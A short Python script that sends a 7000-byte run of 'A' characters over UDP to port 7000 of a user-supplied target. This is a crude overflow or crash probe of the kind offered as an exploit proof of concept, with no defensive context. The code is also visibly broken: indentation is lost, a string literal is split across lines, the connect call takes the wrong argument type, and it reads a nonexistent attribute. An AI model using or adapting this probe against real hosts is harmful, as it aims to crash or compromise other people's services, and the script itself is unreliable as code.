#!/usr/bin/env python

# coding:utf-8

import socket

import sys

if len(sys.argv) < 2:

print("

Usage: %s <target>

" % sys.argv[0])

sys.exit(1)

target = sys.argv[1]

# create a socket

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# connect to the target

s.connect(("%s" % target))

print("[+] Connected to %s" % target)

# send a UDP packet to the target

data = "A" * 7000

s.sendto(data, (target, 7000))

print("[+] Packet sent")

# wait for a response

resp = s.recvfrom(10000)

print("[+] Received %d bytes from %s" % (resp.length, resp[0]))